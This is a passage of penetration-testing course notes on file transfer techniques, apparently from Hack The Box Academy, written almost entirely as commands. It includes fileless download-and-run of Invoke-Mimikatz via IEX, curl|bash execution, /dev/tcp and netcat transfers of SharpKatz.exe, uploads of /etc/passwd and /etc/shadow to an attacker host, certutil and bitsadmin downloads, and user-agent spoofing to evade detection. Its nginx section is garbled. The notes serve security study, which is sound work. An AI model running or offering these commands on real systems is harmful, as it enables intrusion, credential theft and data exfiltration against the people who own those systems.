<li>Get md5 file hash on Windows: <code>Get-FileHash C:\Users\Public\id_rsa -Algorithm md5</code></li>
<li>Get md5 file hash on Linux: <code>md5sum id_rsa</code></li>
</ol>
</li>
<li>PowerShell DownloadFile Method<ol>
<li><code>(New-Object Net.WebClient).DownloadFile('&lt;Target File URL&gt;','&lt;Output File Name&gt;')</code></li>
<li><code>(New-Object Net.WebClient).DownloadFileAsync('&lt;Target File URL&gt;','&lt;Output File Name&gt;')</code></li>
</ol>
</li>
<li>PowerShell DownloadString - Fileless Method**<ol>
<li><code>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')</code></li>
<li><code>(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX</code></li>
</ol>
</li>
<li>PowerShell Invoke-WebRequest: <code>Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1</code></li>
<li>Common Errors with PowerShell:<ol>
<li>The parameter -UseBasicParsing: <code>Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX</code></li>
<li>The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel." <code>[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}</code></li>
</ol>
</li>
</ol>
<h4 id="smb-downloads"><strong>SMB Downloads</strong></h4>
<ol>
<li>Create the SMB Server: <code>sudo impacket-smbserver share -smb2support /tmp/smbshare</code></li>
<li>sudo impacket-smbserver share -smb2support /tmp/smbshare: <code>copy \\192.168.220.133\share\nc.exe</code></li>
<li>Create the SMB Server with a Username and Password: <code>sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test</code></li>
<li>Mount the SMB Server with Username and Password: <code>net use n: \\192.168.220.133\share /user:test test</code></li>
</ol>
<h4 id="ftp-downloads"><strong>FTP Downloads</strong></h4>
<ol>
<li><code>sudo pip3 install pyftpdlib</code></li>
<li>Setting up a Python3: <code>sudo python3 -m pyftpdlib --port 21</code></li>
<li>Transfering Files from an FTP Server Using PowerShell: <code>(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')</code></li>
</ol>
<h4 id="powershell-web-uploads"><strong><em>*</em>PowerShell Web Uploads</strong></h4>
<ol>
<li><code>pip3 install uploadserver</code></li>
<li><code>python3 -m uploadserver</code></li>
<li>`PowerShell Script to Upload a File to Python Upload Server:<ol>
<li><code>IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')</code></li>
<li><code>Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts</code></li>
</ol>
</li>
<li>PowerShell Base64 Web Upload <ol>
<li><code>$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))</code></li>
<li><code>Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64</code></li>
</ol>
</li>
</ol>
<h4 id="smb-uploads"><strong>SMB Uploads</strong></h4>
<ol>
<li>Installing WebDav Python modules: <code>sudo pip3 install wsgidav cheroot</code></li>
<li>Using the WebDav Python module: <code>sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous</code></li>
<li>Connecting to the Webdav Share: <code>dir \\192.168.49.128\DavWWWRoot</code></li>
<li>Uploading Files using SMB: <ol>
<li><code>copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\</code></li>
<li><code>copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\</code></li>
</ol>
</li>
</ol>
<h4 id="ftp-uploads"><strong>FTP Uploads</strong></h4>
<ol>
<li><code>sudo python3 -m pyftpdlib --port 21 --write</code></li>
<li>PowerShell Upload File: <code>(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')</code></li>
<li>Create a Command File for the FTP Client to Upload a File: <ol>
<li><code>echo open 192.168.49.128 &gt; ftpcommand.txt</code></li>
<li><code>echo USER anonymous &gt;&gt; ftpcommand.txt</code></li>
<li><code>echo binary &gt;&gt; ftpcommand.txt</code></li>
<li><code>echo PUT c:\windows\system32\drivers\etc\hosts &gt;&gt; ftpcommand.txt</code></li>
<li><code>echo bye &gt;&gt; ftpcommand.txt</code></li>
<li><code>echo bye &gt;&gt; ftpcommand.txt</code></li>
<li><code>open 192.168.49.128</code></li>
<li><code>USER anonymous</code></li>
<li><code>PUT c:\windows\system32\drivers\etc\hosts</code></li>
<li><code>bye</code></li>
</ol>
</li>
</ol>
<h2 id="linux-file-transfer-methods"><strong>Linux File Transfer Methods</strong></h2>
<ol>
<li>Check File MD5 hash: <code>md5sum id_rsa</code></li>
<li>Encode SSH Key to Base64: <code>cat id_rsa |base64 -w 0;echo</code></li>
<li>Decode the File: <code>echo -n 'LS0tL(...))tLQo=' | base64 -d &gt; id_rsa</code></li>
</ol>
<h4 id="web-downloads-with-wget-and-curl"><strong>Web Downloads with Wget and cURL</strong></h4>
<ol>
<li>Download a File Using wget: <code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code></li>
<li>Download a File Using cURL: <code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code></li>
</ol>
<h4 id="fileless-attacks-using-linux"><strong>Fileless Attacks Using Linux</strong></h4>
<ol>
<li>Fileless Download with cURL: <code>curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash</code></li>
<li>Fileless Download with wget: <code>wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3</code></li>
</ol>
<h4 id="download-with-bash-devtcp"><strong>Download with Bash (/dev/tcp)</strong></h4>
<ol>
<li>Connect to the Target Webserver: <code>exec 3&lt;&gt;/dev/tcp/10.10.10.32/80</code></li>
<li>HTTP GET Request: <code>echo -e "GET /LinEnum.sh HTTP/1.1\n\n"&gt;&amp;3</code></li>
<li>Print the Response: <code>cat &lt;&amp;3</code></li>
</ol>
<h4 id="ssh-downloads"><strong>SSH Downloads</strong></h4>
<ol>
<li>Enabling the SSH Server: <code>sudo systemctl enable ssh</code></li>
<li>Starting the SSH Server: <code>sudo systemctl start ssh</code></li>
<li>Checking for SSH Listening Port: <code>netstat -lnpt</code></li>
<li>Linux - Downloading Files Using SCP: <code>scp plaintext@192.168.49.128:/root/myroot.txt .</code></li>
</ol>
<h3 id="linux-upload-operations"><strong>Linux Upload Operations</strong></h3>
<ol>
<li>Start Web Server: <code>sudo python3 -m pip install --user uploadserver</code></li>
<li>Pwnbox - Create a Self-Signed Certificate: <code>openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'</code></li>
<li>The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver: <code>mkdir https &amp;&amp; cd https</code></li>
<li>Pwnbox - Start Web Server: <code>sudo python3 -m uploadserver 443 --server-certificate ~/server.pem</code></li>
<li>Linux - Upload Multiple Files: <code>curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure</code></li>
</ol>
<h3 id="alternative-web-file-transfer-method"><strong>Alternative Web File Transfer Method</strong></h3>
<ol>
<li>Creating a Web Server with Python3: <code>python3 -m http.server 9999</code></li>
<li>Creating a Web Server with Python2.7: <code>python2.7 -m SimpleHTTPServer</code></li>
<li>Creating a Web Server with PHP: <code>php -S 0.0.0.0:8000</code></li>
<li>Creating a Web Server with Ruby: <code>ruby -run -ehttpd . -p8000</code></li>
</ol>
<h4 id="scp-upload"><strong>SCP Upload</strong></h4>
<ol>
<li>File Upload using SCP: <code>scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/</code></li>
</ol>
<h2 id="transferring-files-with-code"><strong>Transferring Files with Code</strong></h2>
<ol>
<li>Python 2 - Download: <code>python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'</code></li>
<li>Python 3 - Download: <code>python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'</code></li>
<li>PHP - Downloads a file using PHP file_get_contents() and saves it with file_put_contents(): <code>php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'</code></li>
<li>PHP - Downloads a file using PHP fopen(): <code>php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'</code></li>
<li>PHP - Downloads a file using PHP and pipes it to bash: <code>php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num =&gt; $line) { echo $line; }' | bash</code> </li>
<li>Ruby - Download a File: <code>ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'</code></li>
<li>Perl - Download a File: <code>perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'</code></li>
<li>JS</li>
</ol>
<pre><code class="language-bash">var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);
WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject(&quot;ADODB.Stream&quot;);
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
</code></pre>
<ol>
<li>JS - Download a File Using cscript.exe: <code>cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1</code></li>
<li>VBScript:</li>
</ol>
<pre><code class="language-bash">dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)
dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
xHttp.Open &quot;GET&quot;, WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
</code></pre>
<ol>
<li>VBScript - Download a File using cscript.exe: <code>cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1</code></li>
<li>Upload Operations using Python3:<ol>
<li>Starting the Python uploadserver Module: <code>python3 -m uploadserver</code></li>
<li>Uploading a File Using a Python One-liner: <code>python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'</code></li>
</ol>
</li>
</ol>
<h2 id="miscellaneous-file-transfer-methods"><strong>Miscellaneous File Transfer Methods</strong></h2>
<h4 id="netcat"><strong>NetCat</strong></h4>
<ol>
<li>Connect from attack host to target:<ol>
<li>Compromised Machine - Listening on Port 8000: <code>ncat -l -p 8000 --recv-only &gt; SharpKatz.exe</code> or <code>nc -l -p 8000 &gt; SharpKatz.exe</code></li>
<li>Attack Host - Sending File to Compromised machine: <ol>
<li><code>wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe</code></li>
<li><code>nc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe</code> or <code>nc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe</code> Use send-only flag to close connection after file sending.</li>
</ol>
</li>
</ol>
</li>
<li>Connect from target to Attack Host (NC): <ol>
<li>Attack host Sending File as Input to Netcat:<code>sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe</code></li>
<li>Compromised Machine Connect to Netcat to Receive the File: <code>nc 192.168.49.128 443 &gt; SharpKatz.exe</code></li>
</ol>
</li>
<li>Connect from target to attack host (NCAT):<ol>
<li>Attack Host - Sending File as Input to Ncat - <code>sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe</code></li>
<li>Compromised Machine Connect to Ncat to Receive the File: <code>ncat 192.168.49.128 443 --recv-only &gt; SharpKatz.exe</code></li>
</ol>
</li>
<li>If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/.<ol>
<li>NetCat - Sending File as Input to Netcat: <code>sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe</code> <strong>OR</strong></li>
<li>Ncat - Sending File as Input to Ncat: <code>sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe</code></li>
<li>Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File: <code>cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe</code></li>
</ol>
</li>
</ol>
<h4 id="powershell-session-file-transfer"><strong>PowerShell Session File Transfer</strong></h4>
<ol>
<li>Basic enumeration with <code>whoami</code>, <code>hostname</code>, <code>Test-NetConnection -ComputerName DATABASE01 -Port 5985</code></li>
<li>Create a PowerShell Remoting Session to DATABASE01: <code>$Session = New-PSSession -ComputerName DATABASE01</code></li>
<li>Copy samplefile.txt from our Localhost to the DATABASE01 Session: <code>Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\</code></li>
<li>Copy DATABASE.txt from DATABASE01 Session to our Localhost: <code>Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session</code></li>
</ol>
<h4 id="rdp"><strong>RDP</strong></h4>
<ol>
<li>Mounting a Linux Folder Using rdesktop: <code>rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'</code></li>
<li>Mounting a Linux Folder Using xfreerdp: <code>xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer</code></li>
</ol>
<h2 id="protected-file-transfers"><strong>Protected File Transfers</strong></h2>
<h4 id="file-encryption-on-windows"><strong>File Encryption on Windows</strong></h4>
<ol>
<li>Download <a href="https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1">Invoke-AESEncryption.ps1</a></li>
<li>Import module: <code>Import-Module .\Invoke-AESEncryption.ps1</code></li>
<li>File Encryption Example: <code>Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt</code></li>
</ol>
<h4 id="file-encryption-on-linux"><strong>File Encryption on Linux</strong></h4>
<ol>
<li>Encrypting /etc/passwd with openssl: <code>openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc</code></li>
<li>Decrypt passwd.enc with openssl: <code>openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd</code></li>
</ol>
<h2 id="catching-files-over-https"><strong>Catching Files over HTTP/S</strong></h2>
<ol>
<li>Create a Directory to Handle Uploaded Files: <code>sudo mkdir -p /var/www/uploads/SecretUploadDirectory</code></li>
<li>Change the Owner to www-data: <code>sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory</code></li>
<li>Create Nginx Configuration File:
    ```bash
        server {
        listen 9001;<pre><code>location /SecretUploadDirectory/ {
    root    /var/www/uploads;
    dav_methods PUT;
}
</code></pre>
<p>}
<code>``
4. Symlink our Site to the sites-enabled Directory:</code>sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/<code>5. Start Nginx:</code>sudo systemctl restart nginx.service<code>6. Verifying Errors:
1.</code>tail -2 /var/log/nginx/error.log<code>2.</code>ss -lnpt | grep 80<code>3.</code>ps -ef | grep 2811<code>7. Remove NginxDefault Configuration:</code>sudo rm /etc/nginx/sites-enabled/default<code>8. Upload File Using cURL:
1.</code>curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt<code>2.</code>sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt `</p>
<h2 id="living-off-the-land"><strong>Living off The Land</strong></h2>
<ol>
<li>Using the LOLBAS and GTFOBins Project</li>
<li>File Download with Bitsadmin: <code>bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe</code></li>
<li>Bitstransfer: <code>Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"</code></li>
<li>Certutil: <code>certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe</code> or <code>certutil -urlcache -split -f http://10.10.10.32/nc.exe</code></li>
</ol>
<h2 id="evading-detection"><strong>Evading Detection</strong></h2>
<ol>
<li>Listing out User Agents: <code>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl</code></li>
<li>Request with Chrome User Agent: </li>
<li><code>$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome</code></li>
<li><code>Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"</code></li>
<li>Transferring File with GfxDownloadWrapper.exe: <code>GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"</code></li>
</ol>
</li>
</ol>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.d6f25eb3.min.js"></script>
      
    
  </body>
</html>